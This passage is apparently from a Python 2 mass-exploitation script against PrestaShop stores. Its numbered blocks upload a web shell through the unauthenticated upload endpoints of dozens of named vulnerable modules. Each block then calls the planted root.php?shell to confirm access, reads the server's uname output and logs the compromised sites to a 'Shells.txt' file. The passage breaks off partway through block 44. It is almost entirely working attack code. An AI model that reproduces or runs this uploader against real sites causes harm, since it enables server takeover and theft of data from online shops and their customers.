		bReflexlib = requests.get(url+'/modules/homepageadvertise/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/homepageadvertise/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/homepageadvertise/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 16 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/homepageadvertise2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/homepageadvertise2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/homepageadvertise2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/homepageadvertise2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} homepageadvertise2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 17 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/columnadverts2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/columnadverts2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/columnadverts2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/columnadverts2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} columnadverts2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 18 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/filesupload/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/filesupload/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} filesupload     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/filesupload/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/filesupload/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} filesupload     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 19 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/jro_homepageadvertise/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/jro_homepageadvertise/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/jro_homepageadvertise/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 20 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/jro_homepageadvertise2/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/jro_homepageadvertise2/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/jro_homepageadvertise2/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/jro_homepageadvertise2/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} jro_homepageadvertise2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 21 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/leosliderlayer/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/leosliderlayer/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/leosliderlayer/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/mmodules/leosliderlayer/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 22 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/leosliderlayer/upload_images.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/leosliderlayer/slides/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/leosliderlayer/slides/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/leosliderlayer/slides/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} leosliderlayer2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 23 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/vtemskitter/uploadimage.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/vtemskitter/img/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemskitter     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/vtemskitter/img/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/vtemskitter/img/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} vtemskitter     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 24 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/additionalproductstabs/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/additionalproductstabs/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} additionalproductstabs     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/additionalproductstabs/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/additionalproductstabs/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} additionalproductstabs     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 25 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/addthisplugin/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/addthisplugin/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} addthisplugin     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/addthisplugin/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/addthisplugin/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} addthisplugin     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 26 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/attributewizardpro/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/attributewizardpro/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 27 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro.OLD/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro.OLD/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro.OLD     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/attributewizardpro.OLD/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/attributewizardpro.OLD/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro.OLD     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 28 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/1attributewizardpro/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/1attributewizardpro/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} 1attributewizardpro     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/1attributewizardpro/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/1attributewizardpro/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} 1attributewizardpro     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 29 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/attributewizardpro_x/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/attributewizardpro_x/file_uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro_x     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/attributewizardpro_x/file_uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/attributewizardpro_x/file_uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} attributewizardpro_x     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 30 . PrestaShoP
		
		bReflexup = {'qqfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/advancedslider/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} advancedslider     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/advancedslider/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/advancedslider/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} advancedslider     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 31 . PrestaShoP
		
		bReflexup = {'image' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/cartabandonmentpro/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/cartabandonmentpro/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentpro     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/cartabandonmentpro/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/cartabandonmentpro/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentpro     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 32 . PrestaShoP
		
		bReflexup = {'image' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/cartabandonmentproOld/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/cartabandonmentproOld/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentproOld     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/cartabandonmentproOld/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/cartabandonmentproOld/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} cartabandonmentproOld     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 33 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/videostab/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} videostab     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/videostab/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/videostab/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} videostab     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 34 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/fieldvmegamenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/fieldvmegamenu/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} fieldvmegamenu     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/fieldvmegamenu/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/fieldvmegamenu/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} fieldvmegamenu     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 35 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/orderfiles/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/orderfiles/files/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} orderfiles     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/orderfiles/files/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/orderfiles/files/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} orderfiles     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 36 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_flexmenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_flexmenu/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/pk_flexmenu/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/pk_flexmenu/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 37 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_flexmenu_old/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_flexmenu_old/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu_old     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/pk_flexmenu_old/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/pk_flexmenu_old/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_flexmenu_old     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 38 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/pk_vertflexmenu/ajax/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/pk_vertflexmenu/uploads/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_vertflexmenu     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/pk_vertflexmenu/uploads/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/pk_vertflexmenu/uploads/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} pk_vertflexmenu     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 39 . PrestaShoP
		
		bReflexup = {'images[]' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/nvn_export_orders/upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/nvn_export_orders/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} nvn_export_orders     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/nvn_export_orders/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/nvn_export_orders/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} nvn_export_orders     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 40 . PrestaShoP
		
		bReflexup = {'image_upload' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/tdpsthemeoptionpanel/upload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} tdpsthemeoptionpanel     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/tdpsthemeoptionpanel/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/modules/tdpsthemeoptionpanel/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} tdpsthemeoptionpanel     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 41 . PrestaShoP
		
		bReflexup = {'image_upload' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/modules/psmodthemeoptionpanel/upload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} psmodthemeoptionpanel     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/modules/psmodthemeoptionpanel/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/mmodules/psmodthemeoptionpanel/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} psmodthemeoptionpanel     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 42 . PrestaShoP
		
		bReflexup = {'file' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/lib/redactor/file_upload.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/masseditproduct/uploads/file/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} masseditproduct     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/masseditproduct/uploads/file/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/masseditproduct/uploads/file/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} masseditproduct     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
				
		# 43 . PrestaShoP
		
		bReflexup = {'userfile' : open(jceupshell, 'rb')}
		
		bReflexreq = requests.post(url+'/modules/blocktestimonial/addtestimonial.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/upload/root.php?shell')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} blocktestimonial     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/prestashopshell.txt', 'a').write(url+'/upload/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/upload/root.php'+'\n')
			sys.exit()
		else:
			print '[{}PrestaShoP]: {} {}	       ====> {}{} blocktestimonial     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	


				
		# 44 . PrestaShoP
		
		PostData = {'data': 'bajatax','type': 'pattern_upload'}
		
